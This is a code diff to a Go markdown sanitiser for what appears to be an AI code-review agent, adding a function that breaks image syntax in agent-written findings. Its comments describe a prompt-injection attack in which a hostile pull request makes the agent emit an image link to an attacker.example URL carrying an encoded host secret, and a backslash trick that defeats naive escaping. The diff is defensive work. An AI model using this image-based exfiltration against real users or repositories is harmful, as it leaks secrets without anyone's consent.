@@ -47,15 +47,20 @@ import (
 //  6. An unclosed code fence is closed. Without it a finding's description turns
 //     the rest of the review -- the findings under it and the attribution at the
 //     bottom -- into the inside of a code block.
+//  7. Image syntax is broken back into a link (breakImages). Not because it
+//     reaches past the string -- it does not -- but because it is the one inline
+//     construct that acts with no reader: rendering it FETCHES a URL the agent
+//     chose.
 //
-// What is deliberately NOT escaped is inline markup: emphasis, links, headings,
-// balanced code spans. Those cannot reach past the string they are in, findings
-// use them constantly, and escaping them would make fixpoint misquote its own
-// evidence in exchange for nothing a reader could not already have been told in
-// plain prose.
+// What is deliberately NOT escaped is the rest of inline markup: emphasis, links,
+// headings, balanced code spans. Those cannot reach past the string they are in
+// and do nothing until a human clicks them, findings use them constantly, and
+// escaping them would make fixpoint misquote its own evidence in exchange for
+// nothing a reader could not already have been told in plain prose.
 func SanitizeText(s string) string {
 	s = sanitizeInline(s)
 	s = escapeRawHTML(s)
+	s = breakImages(s)
 	return closeOpenFence(s)
 }
 
@@ -188,6 +193,31 @@ var (
 // A team handle (`@org/team`) notifies a whole group, and it is matched by the
 // same rule: the break lands on the @ itself, so everything after it is inert.
 func breakMentions(s string) string { return mention.ReplaceAllString(s, "$1@<!---->$2") }
+
+// breakImages turns an agent-authored image back into an ordinary link.
+//
+// An image is the only inline markup that acts without a reader. A link to
+// `https://attacker.example/<data>` sits there until somebody clicks it; the same
+// URL written as `![x](...)` is FETCHED the moment the markdown is rendered. So a
+// finding whose text an injected pull request wrote can carry a host secret --
+// encoded past the redactor's heuristics -- out to a server of its choosing, both
+// when the review is posted and when the operator opens review-body.md to decide
+// whether to post it. That is a request nobody made, which is what separates it
+// from every other construct this function leaves alone.
+//
+// The break is the empty comment breakMentions uses, for the same reason: it
+// renders as nothing, so the reader still sees `![x](url)` as the agent wrote it,
+// while the `!` no longer sits against the `[` that would make it an image. What is
+// left is a link, with the destination visible and a click required.
+//
+// Inserting rather than backslash-escaping the `!` is deliberate. `\![x](url)` is
+// already an inert link, and prefixing another backslash would give `\\![x](url)`
+// -- a literal backslash followed by a live image, so a payload could turn the
+// defense into the attack by writing the first backslash itself.
+//
+// It runs here and not in sanitizeInline because no image can form inside a code
+// span, where the comment would render verbatim and misquote the path.
+func breakImages(s string) string { return strings.ReplaceAll(s, "![", "!<!---->[") }
 
 // CodeSpan renders one agent-authored string inside a markdown code span.
 //
